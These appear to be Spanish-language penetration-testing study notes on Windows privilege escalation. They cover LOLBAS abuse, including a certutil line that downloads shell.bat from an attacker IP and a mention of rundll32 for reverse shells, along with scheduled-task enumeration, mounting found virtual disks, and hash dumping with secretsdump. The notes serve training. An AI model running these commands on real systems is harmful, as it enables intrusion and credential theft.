
## Binarios y scripts para LOLBAS

[Proyecto LOLBAS](https://lolbas-project.github.io/) documenta binarios, scripts y librerias que pueden ser usados para tecnicas de LOLBAS en sistemas Windows. Cada uno es un archivo firmado por Microsoft que es nativo del sistema


## Transferencia de archivos con Certutil

[certutil.exe](https://lolbas-project.github.io/lolbas/Binaries/Certutil/): su uso previsto es manejar certificados pero se puede usar para transferir archivos

Descarga:

```
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

Codificacion base64:

```
certutil -encode file1 encodedfile
```
![[Pasted image 20260914150241.png]]

Decodificacion:

```
certutil -decode encodedfile file2
```
![[Pasted image 20260914150303.png]]


[rundll32.exe](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/): puede ser usado para ejecutar archivos DLL y obtener reverse shells

- `Configuración del equipo\Plantillas administrativas\Componentes de Windows\Windows Installer`
- `Configuración de usuario\Plantillas administrativas\Componentes de Windows\Windows Installer`

## Tareas programadas

1. Enumeracion de tareas programadas con [schtasks](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks)

```
schtasks /query /fo LIST /v
```
![[Pasted image 20260914151814.png]]

2. Enumeracion de tareas programadas con PS con [Get-ScheduledTask](https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask?view=windowsserver2019-ps):

```
Get-ScheduledTask | select TaskName,State
```
![[Pasted image 20260914151853.png]]

	Solo podremos ver tareas programadas por nuestro usuario porque la de otros incluidos Administradores se almacena en C:\Windows\System32\Task

Pude que la tarea se encuentre en un directorio que puedan leer todos en forma de script

3. Comprobacion de permisos en el directorio C:\Scripts:

```
.\accesschk64.exe /accepteula -s -d C:\Scripts\
```
![[Pasted image 20260914152119.png]]

## Montar VHDX/VMDK

[Snaffler](https://github.com/SnaffCon/Snaffler): puede enumerar muchos tipos de archivos como archivos con frase pass, bases de datos del keepass, claves ssh...

Hay 3 tipos de archivos de especial interes:

- .vhd: Disco duro virtual
- .vhdx: Disco duro virtual v2
- .vmdk: Disco de maquina virtual

Imagina que no hemos conseguido escalar privs pero vemos un recurso compartido con copias de archivos .vmdk y .vdhx cuyos nombres coinciden con los del hostname:

1. Montar VMDK en Linux:

```
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```

2. Montar VHD/VHDX en Linux:

```
guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```


3 Montar en Windows: Click derecho en el archivo > Montar o Adminsitrador de discos > Action > Create VHD

![[Pasted image 20260914153255.png]]

Para un archivo `.vmdk`, podemos hacer clic derecho y elegir `Mapear disco virtual` en el menú. A continuación, se nos pedirá que seleccionemos una letra de unidad


Si todo va según lo planeado, podremos explorar los archivos y directorios del sistema operativo objetivo. Si esto falla, podemos usar VMWare Workstation `Archivo --> Mapear discos virtuales` para mapear el disco en nuestro sistema base

También podríamos añadir el archivo `.vmdk` a nuestra VM de ataque como un disco duro virtual adicional, y luego acceder a él como una unidad con letra. Incluso podemos usar `7-Zip` para extraer datos de un archivo `.vmdk`. Esta [guía](https://www.nakivo.com/blog/extract-content-vmdk-files-step-step-guide/) ilustra muchos métodos para obtener acceso a los archivos en un archivo `.vmdk`.


3. Recuperacion de hashes con secretsdump:

```
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```
